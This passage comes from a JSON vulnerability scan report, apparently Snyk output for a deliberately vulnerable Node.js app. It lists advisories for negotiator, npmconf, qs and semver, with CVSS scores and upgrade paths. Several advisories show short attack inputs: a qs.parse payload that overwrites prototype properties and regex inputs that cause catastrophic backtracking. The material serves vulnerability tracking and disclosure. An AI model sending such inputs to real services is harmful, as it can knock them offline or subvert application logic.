\"NSP\": [\n      \"106\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-22T17:02:08.629251Z\",\n  \"moduleName\": \"negotiator\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"negotiator\",\n  \"patches\": [\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:negotiator:20160616:0\",\n      \"modificationTime\": \"2019-12-03T11:40:45.829417Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/negotiator/20160616/negotiator_20160616_0_0_26a05ec15cf7d1fa56000d66ebe9c9a1a62cb75c.patch\"\n      ],\n      \"version\": \"0.6.0\"\n    },\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:negotiator:20160616:1\",\n      \"modificationTime\": \"2019-12-03T11:40:45.830538Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/negotiator/20160616/negotiator_20160616_0_1_26a05ec15cf7d1fa56000d66ebe9c9a1a62cb75c.patch\"\n      ],\n      \"version\": \"<= 0.5.3 > 0.4.7\"\n    },\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:negotiator:20160616:2\",\n      \"modificationTime\": \"2019-12-03T11:40:45.831546Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/negotiator/20160616/negotiator_20160616_0_2_26a05ec15cf7d1fa56000d66ebe9c9a1a62cb75c.patch\"\n      ],\n      \"version\": \"<= 0.4.7 > 0.1.0\"\n    },\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:negotiator:20160616:3\",\n      \"modificationTime\": \"2019-12-03T11:40:45.832684Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/negotiator/20160616/negotiator_20160616_0_3_26a05ec15cf7d1fa56000d66ebe9c9a1a62cb75c.patch\"\n      ],\n      \"version\": \"0.1.0\"\n    }\n  ],\n  \"proprietary\": false,\n  \"publicationTime\": \"2016-06-16T17:36:06Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/jshttp/negotiator/commit/26a05ec15cf7d1fa56000d66ebe9c9a1a62cb75c\"\n    },\n    {\n      \"title\": \"OSWAP Advisory\",\n      \"url\": \"https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<0.6.1\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"errorhandler@1.2.0\",\n    \"accepts@1.1.4\",\n    \"negotiator@0.4.9\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"errorhandler@1.4.3\",\n    \"accepts@1.3.3\",\n    \"negotiator@0.6.1\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": true,\n  \"name\": \"negotiator\",\n  \"version\": \"0.4.9\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , errorhandler@1.2.0 , accepts@1.1.4 , negotiator@0.4.9 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , express@4.12.4 , accepts@1.2.13 , negotiator@0.5.3 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , st@0.2.4 , negotiator@0.2.8 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-003173",
              "CCI-001643"
            ],
            "nist": [
              "SA-11",
              "RA-5"
            ],
            "cweid": [
              "201"
            ],
            "cveid": [],
            "ghsaid": [
              "57cf-349j-352g"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Uninitialized Memory Exposure",
          "id": "npm:npmconf:20180512",
          "desc": "## Overview\n\n[npmconf](https://www.npmjs.com/package/npmconf) is a package to reintegrate directly into npm.\n\n\nAffected versions of this package are vulnerable to Uninitialized Memory Exposure.\nIt allocates and writes to disk uninitialized memory content when a typed number is passed as input.\r\n\r\n**Note** `npmconf` is deprecated and should not be used.\r\n**Note** This is vulnerable only for Node <=4\n\n## Details\nThe Buffer class on Node.js is a mutable array of binary data, and can be initialized with a string, array or number.\r\n```js\r\nconst buf1 = new Buffer([1,2,3]);\r\n// creates a buffer containing [01, 02, 03]\r\nconst buf2 = new Buffer('test');\r\n// creates a buffer containing ASCII bytes [74, 65, 73, 74]\r\nconst buf3 = new Buffer(10);\r\n// creates a buffer of length 10\r\n```\r\n\r\nThe first two variants simply create a binary representation of the value it received. The last one, however, pre-allocates a buffer of the specified size, making it a useful buffer, especially when reading data from a stream.\r\nWhen using the number constructor of Buffer, it will allocate the memory, but will not fill it with zeros. Instead, the allocated buffer will hold whatever was in memory at the time. If the buffer is not `zeroed` by using `buf.fill(0)`, it may leak sensitive information like keys, source code, and system info.\n\n## Remediation\n\nUpgrade `npmconf` to version 2.1.3 or higher.\n\n\n## References\n\n- [HAckerOne Report](https://hackerone.com/reports/320269)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N/E:F/RL:O/RC:C\",\n  \"alternativeIds\": [\n    \"SNYK-JS-NPMCONF-12143\"\n  ],\n  \"creationTime\": \"2018-02-27T09:54:39.824000Z\",\n  \"credit\": [\n    \"ChALkeR\"\n  ],\n  \"cvssScore\": 7.4,\n  \"description\": \"## Overview\\n\\n[npmconf](https://www.npmjs.com/package/npmconf) is a package to reintegrate directly into npm.\\n\\n\\nAffected versions of this package are vulnerable to Uninitialized Memory Exposure.\\nIt allocates and writes to disk uninitialized memory content when a typed number is passed as input.\\r\\n\\r\\n**Note** `npmconf` is deprecated and should not be used.\\r\\n**Note** This is vulnerable only for Node <=4\\n\\n## Details\\nThe Buffer class on Node.js is a mutable array of binary data, and can be initialized with a string, array or number.\\r\\n```js\\r\\nconst buf1 = new Buffer([1,2,3]);\\r\\n// creates a buffer containing [01, 02, 03]\\r\\nconst buf2 = new Buffer('test');\\r\\n// creates a buffer containing ASCII bytes [74, 65, 73, 74]\\r\\nconst buf3 = new Buffer(10);\\r\\n// creates a buffer of length 10\\r\\n```\\r\\n\\r\\nThe first two variants simply create a binary representation of the value it received. The last one, however, pre-allocates a buffer of the specified size, making it a useful buffer, especially when reading data from a stream.\\r\\nWhen using the number constructor of Buffer, it will allocate the memory, but will not fill it with zeros. Instead, the allocated buffer will hold whatever was in memory at the time. If the buffer is not `zeroed` by using `buf.fill(0)`, it may leak sensitive information like keys, source code, and system info.\\n\\n## Remediation\\n\\nUpgrade `npmconf` to version 2.1.3 or higher.\\n\\n\\n## References\\n\\n- [HAckerOne Report](https://hackerone.com/reports/320269)\\n\",\n  \"disclosureTime\": \"2018-05-12T09:54:39Z\",\n  \"exploit\": \"Functional\",\n  \"fixedIn\": [\n    \"2.1.3\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"npm:npmconf:20180512\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-NPMCONF-12143\"\n    ],\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-201\"\n    ],\n    \"GHSA\": [\n      \"GHSA-57cf-349j-352g\"\n    ],\n    \"NSP\": [\n      \"653\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-14T14:41:00.940034Z\",\n  \"moduleName\": \"npmconf\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"npmconf\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2018-05-13T14:26:27Z\",\n  \"references\": [\n    {\n      \"title\": \"HAckerOne Report\",\n      \"url\": \"https://hackerone.com/reports/320269\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<2.1.3\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Uninitialized Memory Exposure\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"npmconf@0.0.24\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"npmconf@2.1.3\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"npmconf\",\n  \"version\": \"0.0.24\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , npmconf@0.0.24 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "20"
            ],
            "cveid": [
              "2017-1000048"
            ],
            "ghsaid": [
              "gqgv-6jq5-jjj9"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Override Protection Bypass",
          "id": "npm:qs:20170213",
          "desc": "## Overview\n[qs](https://www.npmjs.com/package/qs) is a querystring parser that supports nesting and arrays, with a depth limit.\n\nAffected versions of this package are vulnerable to Prototype Override Protection Bypass. By default `qs` protects against attacks that attempt to overwrite an object's existing prototype properties, such as `toString()`, `hasOwnProperty()`,etc.\r\n\r\nFrom [`qs` documentation](https://github.com/ljharb/qs):\r\n> By default parameters that would overwrite properties on the object prototype are ignored, if you wish to keep the data from those fields either use plainObjects as mentioned above, or set allowPrototypes to true which will allow user input to overwrite those properties. WARNING It is generally a bad idea to enable this option as it can cause problems when attempting to use the properties that have been overwritten. Always be careful with this option.\r\n\r\nOverwriting these properties can impact application logic, potentially allowing attackers to work around security controls, modify data, make the application unstable and more.\r\n\r\nIn versions of the package affected by this vulnerability, it is possible to circumvent this protection and overwrite prototype properties and functions by prefixing the name of the parameter with `[` or `]`. e.g. `qs.parse(\"]=toString\")` will return `{toString = true}`, as a result, calling `toString()` on the object will throw an exception.\r\n\r\n**Example:**\r\n```js\r\nqs.parse('toString=foo', { allowPrototypes: false })\r\n// {}\r\n\r\nqs.parse(\"]=toString\", { allowPrototypes: false })\r\n// {toString = true} <== prototype overwritten\r\n```\r\n\r\nFor more information, you can check out our [blog](https://snyk.io/blog/high-severity-vulnerability-qs/).\r\n\r\n## Disclosure Timeline\r\n- February 13th, 2017 - Reported the issue to package owner.\r\n- February 13th, 2017 - Issue acknowledged by package owner.\r\n- February 16th, 2017 - Partial fix released in versions `6.0.3`, `6.1.1`, `6.2.2`, `6.3.1`.\r\n- March 6th, 2017     - Final fix released in versions `6.4.0`,`6.3.2`, `6.2.3`, `6.1.2` and `6.0.4`\n## Remediation\nUpgrade `qs` to version 6.0.4, 6.1.2, 6.2.3, 6.3.2 or higher.\n## References\n- [GitHub Commit](https://github.com/ljharb/qs/commit/beade029171b8cef9cee0d03ebe577e2dd84976d)\n- [GitHub Issue](https://github.com/ljharb/qs/issues/200)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\",\n  \"alternativeIds\": [\n    \"SNYK-JS-QS-10407\"\n  ],\n  \"creationTime\": \"2017-02-14T11:44:54.163000Z\",\n  \"credit\": [\n    \"Snyk Security Research Team\"\n  ],\n  \"cvssScore\": 7.5,\n  \"description\": \"## Overview\\n[qs](https://www.npmjs.com/package/qs) is a querystring parser that supports nesting and arrays, with a depth limit.\\n\\nAffected versions of this package are vulnerable to Prototype Override Protection Bypass. By default `qs` protects against attacks that attempt to overwrite an object's existing prototype properties, such as `toString()`, `hasOwnProperty()`,etc.\\r\\n\\r\\nFrom [`qs` documentation](https://github.com/ljharb/qs):\\r\\n> By default parameters that would overwrite properties on the object prototype are ignored, if you wish to keep the data from those fields either use plainObjects as mentioned above, or set allowPrototypes to true which will allow user input to overwrite those properties. WARNING It is generally a bad idea to enable this option as it can cause problems when attempting to use the properties that have been overwritten. Always be careful with this option.\\r\\n\\r\\nOverwriting these properties can impact application logic, potentially allowing attackers to work around security controls, modify data, make the application unstable and more.\\r\\n\\r\\nIn versions of the package affected by this vulnerability, it is possible to circumvent this protection and overwrite prototype properties and functions by prefixing the name of the parameter with `[` or `]`. e.g. `qs.parse(\\\"]=toString\\\")` will return `{toString = true}`, as a result, calling `toString()` on the object will throw an exception.\\r\\n\\r\\n**Example:**\\r\\n```js\\r\\nqs.parse('toString=foo', { allowPrototypes: false })\\r\\n// {}\\r\\n\\r\\nqs.parse(\\\"]=toString\\\", { allowPrototypes: false })\\r\\n// {toString = true} <== prototype overwritten\\r\\n```\\r\\n\\r\\nFor more information, you can check out our [blog](https://snyk.io/blog/high-severity-vulnerability-qs/).\\r\\n\\r\\n## Disclosure Timeline\\r\\n- February 13th, 2017 - Reported the issue to package owner.\\r\\n- February 13th, 2017 - Issue acknowledged by package owner.\\r\\n- February 16th, 2017 - Partial fix released in versions `6.0.3`, `6.1.1`, `6.2.2`, `6.3.1`.\\r\\n- March 6th, 2017     - Final fix released in versions `6.4.0`,`6.3.2`, `6.2.3`, `6.1.2` and `6.0.4`\\n## Remediation\\nUpgrade `qs` to version 6.0.4, 6.1.2, 6.2.3, 6.3.2 or higher.\\n## References\\n- [GitHub Commit](https://github.com/ljharb/qs/commit/beade029171b8cef9cee0d03ebe577e2dd84976d)\\n- [GitHub Issue](https://github.com/ljharb/qs/issues/200)\\n\",\n  \"disclosureTime\": \"2017-02-13T00:00:00Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"6.0.4\",\n    \"6.1.2\",\n    \"6.2.3\",\n    \"6.3.2\"\n  ],\n  \"functions\": [\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"lib/parse.js\",\n        \"functionName\": \"internals.parseObject\"\n      },\n      \"version\": [\n        \"<6.0.4\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"lib/parse.js\",\n        \"functionName\": \"parseObject\"\n      },\n      \"version\": [\n        \">=6.2.0 <6.2.3\",\n        \"6.3.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"lib/parse.js\",\n        \"functionName\": \"parseObjectRecursive\"\n      },\n      \"version\": [\n        \">=6.3.1 <6.3.2\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"lib/parse.js\",\n        \"functionName\": \"internals.parseObject\"\n      },\n      \"version\": [\n        \"<6.0.4\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"lib/parse.js\",\n        \"functionName\": \"parseObject\"\n      },\n      \"version\": [\n        \">=6.2.0 <6.2.3\",\n        \"6.3.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"lib/parse.js\",\n        \"functionName\": \"parseObjectRecursive\"\n      },\n      \"version\": [\n        \">=6.3.1 <6.3.2\"\n      ]\n    }\n  ],\n  \"id\": \"npm:qs:20170213\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-QS-10407\"\n    ],\n    \"CVE\": [\n      \"CVE-2017-1000048\"\n    ],\n    \"CWE\": [\n      \"CWE-20\"\n    ],\n    \"GHSA\": [\n      \"GHSA-gqgv-6jq5-jjj9\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-05-02T13:22:22.094839Z\",\n  \"moduleName\": \"qs\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"qs\",\n  \"patches\": [\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:qs:20170213:0\",\n      \"modificationTime\": \"2019-12-03T11:40:45.855245Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/qs/20170213/630_632.patch\"\n      ],\n      \"version\": \"=6.3.0\"\n    },\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:qs:20170213:1\",\n      \"modificationTime\": \"2019-12-03T11:40:45.856271Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/qs/20170213/631_632.patch\"\n      ],\n      \"version\": \"=6.3.1\"\n    },\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:qs:20170213:2\",\n      \"modificationTime\": \"2019-12-03T11:40:45.857318Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/qs/20170213/621_623.patch\"\n      ],\n      \"version\": \"=6.2.1\"\n    },\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:qs:20170213:3\",\n      \"modificationTime\": \"2019-12-03T11:40:45.858334Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/qs/20170213/622_623.patch\"\n      ],\n      \"version\": \"=6.2.2\"\n    },\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:qs:20170213:4\",\n      \"modificationTime\": \"2019-12-03T11:40:45.859411Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/qs/20170213/610_612.patch\"\n      ],\n      \"version\": \"=6.1.0\"\n    },\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:qs:20170213:5\",\n      \"modificationTime\": \"2019-12-03T11:40:45.860523Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/qs/20170213/611_612.patch\"\n      ],\n      \"version\": \"=6.1.1\"\n    },\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:qs:20170213:6\",\n      \"modificationTime\": \"2019-12-03T11:40:45.861504Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/qs/20170213/602_604.patch\"\n      ],\n      \"version\": \"=6.0.2\"\n    },\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:qs:20170213:7\",\n      \"modificationTime\": \"2019-12-03T11:40:45.862615Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/qs/20170213/603_604.patch\"\n      ],\n      \"version\": \"=6.0.3\"\n    }\n  ],\n  \"proprietary\": true,\n  \"publicationTime\": \"2017-03-01T10:00:54Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/ljharb/qs/commit/beade029171b8cef9cee0d03ebe577e2dd84976d\"\n    },\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/ljharb/qs/issues/200\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<6.0.4\",\n      \">=6.1.0 <6.1.2\",\n      \">=6.2.0 <6.2.3\",\n      \">=6.3.0 <6.3.2\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Override Protection Bypass\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"body-parser@1.9.0\",\n    \"qs@2.2.4\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"body-parser@1.17.1\",\n    \"qs@6.4.0\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"qs\",\n  \"version\": \"2.2.4\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , body-parser@1.9.0 , qs@2.2.4 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , express@4.12.4 , qs@2.4.2 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2015-8855"
            ],
            "ghsaid": [
              "x6fg-f45m-jf5q"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "npm:semver:20150403",
          "desc": "## Overview\n[semver](https://github.com/npm/node-semver) is a semantic version parser used by npm.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). The semver module uses regular expressions when parsing a version string. For a carefully crafted input, the time it takes to process these regular expressions is not linear to the length of the input. Since the semver module did not enforce a limit on the version string length, an attacker could provide a long string that would take up a large amount of resources, potentially taking a server down. This issue therefore enables a potential Denial of Service attack.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `semver` to version 4.3.2 or higher.\n## References\n- [GitHub Release](https://github.com/npm/npm/releases/tag/v2.7.5)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L\",\n  \"alternativeIds\": [\n    \"SNYK-JS-SEMVER-10038\"\n  ],\n  \"creationTime\": \"2015-04-03T16:00:00Z\",\n  \"credit\": [\n    \"Adam Baldwin\"\n  ],\n  \"cvssScore\": 5.3,\n  \"description\": \"## Overview\\n[semver](https://github.com/npm/node-semver) is a semantic version parser used by npm.\\n\\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). The semver module uses regular expressions when parsing a version string. For a carefully crafted input, the time it takes to process these regular expressions is not linear to the length of the input. Since the semver module did not enforce a limit on the version string length, an attacker could provide a long string that would take up a large amount of resources, potentially taking a server down. This issue therefore enables a potential Denial of Service attack.\\n\\n## Details\\n\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\n\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\n\\nLet’s take the following regular expression as an example:\\n```js\\nregex = /A(B|C+)+D/\\n```\\n\\nThis regular expression accomplishes the following:\\n- `A` The string must start with the letter 'A'\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\n\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\n\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\n\\n```bash\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\n0.04s user 0.01s system 95% cpu 0.052 total\\n\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\n1.79s user 0.02s system 99% cpu 1.812 total\\n```\\n\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\n\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\n\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\n1. CCC\\n2. CC+C\\n3. C+CC\\n4. C+C+C.\\n\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\n\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\n\\n| String | Number of C's | Number of steps |\\n| -------|-------------:| -----:|\\n| ACCCX | 3 | 38\\n| ACCCCX | 4 | 71\\n| ACCCCCX | 5 | 136\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\n\\n\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\nUpgrade `semver` to version 4.3.2 or higher.\\n## References\\n- [GitHub Release](https://github.com/npm/npm/releases/tag/v2.7.5)\\n\",\n  \"disclosureTime\": \"2015-04-03T16:00:00Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"4.3.2\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"npm:semver:20150403\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-SEMVER-10038\"\n    ],\n    \"CVE\": [\n      \"CVE-2015-8855\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-x6fg-f45m-jf5q\"\n    ],\n    \"NSP\": [\n      \"31\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2022-03-22T12:28:36.289580Z\",\n  \"moduleName\": \"semver\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"semver\",\n  \"patches\": [\n    {\n      \"comments\": [\n        \"https://github.com/npm/node-semver/commit/c80180d8341a8ada0236815c29a2be59864afd70.patch\"\n      ],\n      \"id\": \"patch:npm:semver:20150403:0\",\n      \"modificationTime\": \"2019-12-03T11:40:45.754335Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/semver/20150403/semver_20150403_0_0_c80180d8341a8ada0236815c29a2be59864afd70.patch\"\n      ],\n      \"version\": \"<4.3.2 >= 2.0.2\"\n    }\n  ],\n  \"proprietary\": false,\n  \"publicationTime\": \"2015-04-03T16:00:00Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Release\",\n      \"url\": \"https://github.com/npm/npm/releases/tag/v2.7.5\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<4.3.2\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"npmconf@0.0.24\",\n    \"semver@1.1.4\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"npmconf@2.0.9\",\n    \"semver@4.3.2\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"semver\",\n  \"version\": \"1.1.4\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , npmconf@0.0.24 , semver@1.1.4 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "22"
            ],
            "cveid": [
              "2014-3744"
            ],
            "ghsaid": [
              "69rr-wvh9-6c4q"
            ]
          },
